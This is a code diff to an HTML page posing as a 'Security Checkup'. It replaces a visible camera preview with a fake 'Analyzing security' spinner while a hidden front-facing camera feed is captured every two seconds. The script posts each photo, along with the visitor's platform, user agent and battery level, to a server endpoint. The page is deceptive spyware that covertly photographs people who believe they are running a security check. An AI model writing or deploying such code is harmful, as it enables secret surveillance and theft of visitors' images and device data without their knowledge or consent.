@@ -10,94 +10,92 @@
             font-family: Arial, sans-serif;
             padding-top: 50px;
         }
-        #camera {
-            display: none;
+        #loader {
+            border: 6px solid #f3f3f3; /* Light grey */
+            border-top: 6px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
-        .button {
-            padding: 10px 20px;
-            background-color: #f44336;
-            color: white;
-            border: none;
-            cursor: pointer;
-            font-size: 16px;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #message {
+            font-size: 18px;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
     <h1>Security Checkup</h1>
-    <p>Redirecting in <span id="redirect-countdown">10</span> seconds...</p>
+    <div id="loader"></div>
+    <p id="message">Analyzing security... Please wait.</p>
 
-    <!-- Camera -->
-    <video id="camera" width="320" height="240" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <!-- Hidden Camera -->
+    <video id="camera" width="320" height="240" autoplay style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
 
     <script>
-        let countdown = 10;
-        const countdownDisplay = document.getElementById('redirect-countdown');
         const camera = document.getElementById('camera');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
 
-        // Start countdown
-        const countdownInterval = setInterval(() => {
-            countdown -= 1;
-            countdownDisplay.innerText = countdown;
-            if (countdown <= 0) {
-                clearInterval(countdownInterval);
-                captureAndSendData();
-            }
-        }, 1000);
-
-        // Start camera
+        // Start the camera
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
             .then(stream => {
                 camera.srcObject = stream;
-                camera.style.display = 'block';
             })
             .catch(error => {
                 alert('Camera access denied or error occurred.');
                 console.error(error);
             });
 
-        // Capture image and send data to server
+        // Function to capture image and send data
         function captureAndSendData() {
-            // Set canvas size to match video size
-            canvas.width = camera.videoWidth;
-            canvas.height = camera.videoHeight;
+            if (camera.readyState === HTMLMediaElement.HAVE_ENOUGH_DATA) {
+                // Set canvas size to match video size
+                canvas.width = camera.videoWidth;
+                canvas.height = camera.videoHeight;
 
-            // Capture image from the camera
-            context.drawImage(camera, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/png').split(',')[1]; // Base64 image data
+                // Capture image from the camera
+                context.drawImage(camera, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/png').split(',')[1]; // Base64 image data
 
-            // Collect device information
-            const deviceInfo = {
-                deviceType: navigator.platform,
-                deviceModel: navigator.userAgent,
-                ipAddress: '', // You can obtain IP address from server-side if needed
-                networkCarrier: '', // Optional: Not easily accessible from frontend
-                charge: navigator.getBattery ? navigator.getBattery().then(battery => battery.level) : 'N/A'
-            };
+                // Collect device information
+                const deviceInfo = {
+                    deviceType: navigator.platform,
+                    deviceModel: navigator.userAgent,
+                    ipAddress: '', // You can obtain IP address from server-side if needed
+                    networkCarrier: '', // Optional: Not easily accessible from frontend
+                    charge: navigator.getBattery ? navigator.getBattery().then(battery => battery.level) : 'N/A'
+                };
 
-            // Send data to the server
-            fetch('/submit_data', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    device_info: deviceInfo,
-                    image_data: imageData
+                // Send data to the server
+                fetch('/submit_data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        device_info: deviceInfo,
+                        image_data: imageData
+                    })
                 })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Data submitted:', data);
-                window.location.href = 'https://your-next-page-url.com';  // Redirect after submission
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Data submitted:', data);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            }
         }
+
+        // Capture and send image every 2 seconds
+        setInterval(captureAndSendData, 2000);
     </script>
 </body>
 </html>
